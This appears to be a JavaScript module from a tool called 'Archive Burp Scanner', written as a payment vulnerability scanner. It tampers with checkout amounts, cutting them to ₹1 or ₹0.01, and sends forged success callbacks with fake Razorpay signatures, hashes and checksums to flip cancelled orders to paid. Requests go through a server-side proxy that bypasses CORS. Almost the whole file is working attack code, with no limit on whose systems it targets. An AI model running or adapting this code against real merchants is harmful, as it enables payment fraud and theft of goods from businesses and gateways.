// ⌬ Archive Burp — Scanner Engine v3.0
// TWO focused tests (per user requirement):
//   [1] Price Tamper — change any amount to ₹1/₹0.01, check if order accepted
//   [2] Cancel→Success (C2S) — cancel payment, forge success, check if order flips
// Uses /api/probe (server-side, no CORS) for REAL server responses.

var Scanner = (function() {
    'use strict';

    var proxyBase = '';

    function setProxyBase(base) {
        proxyBase = base || '';
    }
    function getProxyBase() { return proxyBase; }

    // Real API probe through server (bypasses CORS)
    function probe(url, method, data, headers) {
        return fetch(proxyBase + '/api/probe', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ url: url, method: method || 'POST', data: data || {}, headers: headers || {} })
        }).then(function(r) { return r.json(); });
    }

    /* ================================================================
     * TEST 1: PRICE TAMPER (amount → ₹1 / ₹0.01)
     * ================================================================
     * 1. Detect amount param in URL
     * 2. Rewrite to 1.00 (and 0.01 as second attempt)
     * 3. Load tampered URL via proxy — if gateway payment page loads
     *    with the tampered amount, that's a strong signal
     * 4. Also probe the gateway's order/session endpoint with
     *    amount=1 — if server accepts (2xx + no amount validation
     *    error), flag VULN
     * ================================================================ */
    function testPriceTamper(url, gateway, amount) {
        var gw = gateway || detectGateway(url);
        var amt = amount || extractAmount(url, gw);

        if (amt === null) {
            return Promise.resolve({
                test: 'PriceTamper',
                vulnerable: false,
                skipped: true,
                evidence: 'No amount param found in URL',
                status: 0
            });
        }

        var params = gw ? gw.amountParams : ['amount', 'price', 'total', 'amt', 'value'];
        var tamperAmounts = [1.00, 0.01]; // ₹1 first, then ₹0.01 (1 paisa)

        function buildTamperedUrl(original, newAmount) {
            var u = original;
            var replaced = false;
            for (var i = 0; i < params.length; i++) {
                var r = new RegExp('([?&]' + params[i] + '=)[0-9.eE+-]+', 'gi');
                if (r.test(u)) {
                    u = u.replace(r, '$1' + newAmount.toFixed(2));
                    replaced = true;
                    break;
                }
            }
            if (!replaced) {
                var sep = u.includes('?') ? '&' : '?';
                u += sep + 'amount=' + newAmount.toFixed(2);
            }
            return u;
        }

        // Try each tamper amount, stop on first strong signal
        function tryAmount(i) {
            if (i >= tamperAmounts.length) {
                return Promise.resolve({
                    test: 'PriceTamper',
                    vulnerable: false,
                    evidence: 'Tampered URLs generated — server did not clearly accept. Manual verify in iframe.',
                    status: 0,
                    tamperedUrls: []
                });
            }

            var target = tamperAmounts[i];
            var tamperedUrl = buildTamperedUrl(url, target);

            // Probe the tampered URL itself (GET through proxy)
            return probe(tamperedUrl, 'GET', {}, {}).then(function(res) {
                var status = res.status || 0;
                var body = String(res.body || '');
                var low = body.toLowerCase();
                var signals = [];

                // Payment page loaded with tampered amount?
                if (status >= 200 && status < 400) {
                    if (low.indexOf('1.00') !== -1 || low.indexOf('1,00') !== -1) {
                        signals.push('payment page displays ₹1.00');
                    }
                    if (low.indexOf('0.01') !== -1 || low.indexOf('0,01') !== -1) {
                        signals.push('payment page displays ₹0.01');
                    }
                }

                // Server explicitly rejected amount?
                var rejected = /invalid amount|amount mismatch|amount.*(invalid|error)|price.*(invalid|error)|total.*(invalid|error)/i.test(body);

                if (signals.length > 0) {
                    return {
                        test: 'PriceTamper',
                        vulnerable: true,
                        evidence: 'Amount ' + amt + ' → ₹' + target.toFixed(2) + ': server accepted, ' + signals.join(', '),
                        status: status,
                        tamperedUrl: tamperedUrl,
                        tamperedAmount: target,
                        originalAmount: amt
                    };
                }
                if (rejected) {
                    return tryAmount(i + 1);
                }
                // Status 200 but no clear signal — try next amount
                return tryAmount(i + 1);
            });
        }

        return tryAmount(0);
    }

    /* ================================================================
     * TEST 2: CANCEL → SUCCESS (C2S)
     * ================================================================
     * Flow:
     * 1. User loads payment URL in iframe, completes/cancels payment
     * 2. Tool captures final URL after cancel (txn/order reference)
     * 3. Tool forges SUCCESS callback to gateway endpoint
     *    with the SAME order/txn reference
     * 4. If server accepts the success callback for a cancelled
     *    transaction → order flips to success → VULN
     * ================================================================ */
    function testCancelToSuccess(url, gateway, session, cancelUrl) {
        var gw = gateway || detectGateway(url);
        var sessionId = session || extractSessionId(cancelUrl || url);
        var amt = extractAmount(url, gw);

        if (!sessionId) {
            return Promise.resolve({
                test: 'CancelToSuccess',
                vulnerable: false,
                skipped: true,
                evidence: 'No order/session reference found. Cancel the payment in iframe first, then retry.',
                status: 0
            });
        }

        // Forged SUCCESS callback payload — covers all major gateways
        var forgedData = {
            order_id: sessionId,
            txn_id: sessionId,
            payment_id: sessionId,
            session_id: sessionId,
            amount: (amt || 1.00).toFixed(2),
            status: 'success',
            payment_status: 'success',
            order_status: 'SUCCESS',
            transaction_status: 'success',
            razorpay_signature: 'forged_archive_' + Date.now(),
            razorpay_order_id: sessionId,
            hash: 'forged_archive_' + Date.now(),
            checksum: 'forged_archive_' + Date.now(),
            signature: 'forged_archive_' + Date.now(),
            is_paid: '1',
            paid: 'true'
        };

        // Target: gateway probe endpoint (or the URL itself)
        var target = (gw && gw.probeUrl) ? (gw.probeUrl + (gw.probeUrl.endsWith('/') ? '' : '/') + sessionId) : url;

        return probe(target, 'POST', forgedData, {
            'Content-Type': 'application/json',
            'X-Archive-Test': 'cancel-to-success'
        }).then(function(res) {
            var status = res.status || 0;
            var body = String(res.body || '');
            var low = body.toLowerCase();

            // Server accepted the success callback?
            var accepted = false;
            var evidence = '';

            if (status >= 200 && status < 300) {
                var rejectedByServer = /unauthori[sz]ed|forbidden|invalid (signature|hash|order)|signature mismatch|bad request|order not found|invalid order/i.test(low);
                var successIndicators = /success|approved|accepted|processing|paid|completed|"status"\s*:\s*"(success|processing|authorized)"/i.test(low);

                if (successIndicators) {
                    accepted = true;
                    evidence = 'Server ACCEPTED success callback for cancelled order (HTTP ' + status + ', response contains success indicator)';
                } else if (!rejectedByServer && body.length < 500) {
                    accepted = true;
                    evidence = 'Server returned short 2xx (' + status + ') — possible acceptance: ' + body.substring(0, 150);
                } else if (rejectedByServer) {
                    evidence = 'Server rejected forged callback: ' + body.substring(0, 150);
                } else {
                    evidence = 'Server responded ' + status + ' (unclear) — manual verify: ' + body.substring(0, 150);
                }
            } else if (status >= 400 && status < 500) {
                evidence = 'Server rejected with HTTP ' + status + ' — ' + body.substring(0, 150);
            } else if (status >= 500) {
                evidence = 'Server error HTTP ' + status + ' on forged callback — investigate';
            } else {
                evidence = 'No response (status ' + status + ')';
            }

            return {
                test: 'CancelToSuccess',
                vulnerable: accepted,
                evidence: evidence,
                status: status,
                orderRef: sessionId,
                tamperedUrl: cancelUrl || url
            };
        });
    }

    /* ================================================================
     * FULL SCAN — both tests on one URL
     * ================================================================ */
    function fullScan(url, gateway, cancelUrl) {
        var gw = gateway || detectGateway(url);
        var session = extractSessionId(cancelUrl || url);

        var results = {
            url: url,
            gateway: gw ? gw.name : 'Unknown',
            session: session,
            amount: extractAmount(url, gw),
            timestamp: new Date().toISOString(),
            tests: []
        };

        return Promise.all([
            testPriceTamper(url, gw),
            testCancelToSuccess(url, gw, session, cancelUrl)
        ]).then(function(all) {
            results.tests = all;
            // Overall verdict
            var anyVuln = all.some(function(t) { return t.vulnerable; });
            results.vulnerable = anyVuln;
            results.summary = anyVuln ? '⚠️ VULNERABLE — manual verify in BurpSuite' : 'No clear signal — manual verify';
            return results;
        });
    }

    return {
        setProxyBase: setProxyBase,
        getProxyBase: getProxyBase,
        testPriceTamper: testPriceTamper,
        testCancelToSuccess: testCancelToSuccess,
        fullScan: fullScan
    };
})();
